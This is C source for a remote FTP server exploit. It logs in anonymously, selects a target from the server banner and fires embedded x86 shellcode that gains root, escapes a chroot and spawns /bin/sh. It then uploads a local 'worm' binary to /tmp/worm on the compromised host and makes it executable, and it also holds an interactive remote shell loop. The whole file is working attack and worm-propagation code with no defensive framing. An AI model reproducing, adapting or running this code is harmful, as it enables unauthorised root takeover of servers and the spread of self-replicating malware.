#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "exploit.h"

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

unsigned char shellcode[] = \
    "\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\xeb\x36\x5e\x88\x46\x0a"
    "\x8d\x5e\x05\xb1\xed\xb0\x27\xcd\x80\x31\xc0\xb0\x3d\xcd\x80\x83"
    "\xc3\x02\xb0\x0c\xcd\x80\xe0\xfa\xb0\x3d\xcd\x80\x89\x76\x08\x31"
    "\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x89\xc2\xb0\x0b"
    "\xcd\x80\xe8\xc5\xff\xff\xff/bin/sh..";


void upload(int fd);
int shell(int sock);

int main(int argc, char *argv[]) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;
    unsigned int mlen = 0;
    unsigned char mcode[256];
    char *hostname;
    char *username = "ftp";
    char *password = "ftp";

    if (argc < 2) {
        fprintf(stderr, "Usage:\n\n\t%s TARGET_IP\n\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    hostname = argv[1];

    printf("#\n");
    printf("# FTP Exploit\n");
    printf("#\n");

    printf("# Connecting to %s with (%s/%s)...", hostname, username, password);
    fd = ftp_login(hostname, username, password, &banner);
    if (fd <= 0) {
        printf (" fail.\n");
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }
    printf(" connected.\n");

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            printf ("# Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    printf ("# Running exploit...");
    ret = exploit (fd, target, shellcode);
    if (ret != 0) {
        printf (" fail.\n");
        printf("# Failed to run exploit against %s.", hostname);
        exit(EXIT_FAILURE);
    }
    printf (" success.\n");

    upload(fd);

    close(fd);

    // open a shell
    /*ret = shell(fd);
    if (ret != 0) {
        exit(EXIT_FAILURE);
    }*/

    exit(EXIT_SUCCESS);
}

void upload(int fd) {
    static unsigned char model[] = \
        "echo -n -e '\\x%02x\\x%02x\\x%02x\\x%02x"
        "\\x%02x\\x%02x\\x%02x\\x%02x"
        "\\x%02x\\x%02x\\x%02x\\x%02x"
        "\\x%02x\\x%02x\\x%02x\\x%02x' >> /tmp/worm; echo done\n";

    unsigned char *worm_buf;
    unsigned char buf[256];
    FILE *worm_fd;
    int worm_size, size;
    int i;

    worm_fd = fopen("./worm", "rb");
    fseek(worm_fd, 0, SEEK_END);
    worm_size = ftell(worm_fd);
    fseek(worm_fd, 0, SEEK_SET);
    worm_buf = (unsigned char*) malloc(worm_size + 1);
    fread((void*) worm_buf, worm_size, 1, worm_fd);

    write(fd, "rm -f /tmp/worm\n", strlen("rm -f /tmp/worm\n"));

    printf("Pushing file");
    for (i=0; i<worm_size; i+=16) {
        sprintf(buf, model,
            worm_buf[i+0], worm_buf[i+1], worm_buf[i+2], worm_buf[i+3],
            worm_buf[i+4], worm_buf[i+5], worm_buf[i+6], worm_buf[i+7],
            worm_buf[i+8], worm_buf[i+9], worm_buf[i+10], worm_buf[i+11],
            worm_buf[i+12], worm_buf[i+13], worm_buf[i+14], worm_buf[i+15]
        );
        write(fd, buf, strlen(buf)+1);
        read(fd, buf, sizeof(buf));

        // print progress
        printf("."); fflush(stdout);
    }
    printf(" [done]\n");

    write(fd, "chmod +x /tmp/worm\n", strlen("chmod +x /tmp/worm\n"));
    write(fd, "echo done\n", strlen("echo done\n"));

    read(fd, buf, sizeof(buf));
}


int shell(int sock) {
    int l;
    char buf[512];
    fd_set  rfds;

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(sock, &rfds);

        select(sock + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            l = read(0, buf, sizeof (buf));
            if (l <= 0) {
                perror("read user");
                return -1;
            }
            write (sock, buf, l);
        }

        if (FD_ISSET(sock, &rfds)) {
            l = read(sock, buf, sizeof (buf));
            if (l == 0) {
                printf("connection closed by foreign host.\n");
                return -1;
            } else if (l < 0) {
                perror("read remote");
                return -1;
            }
            write (1, buf, l);
        }
    }

    return 0;
}
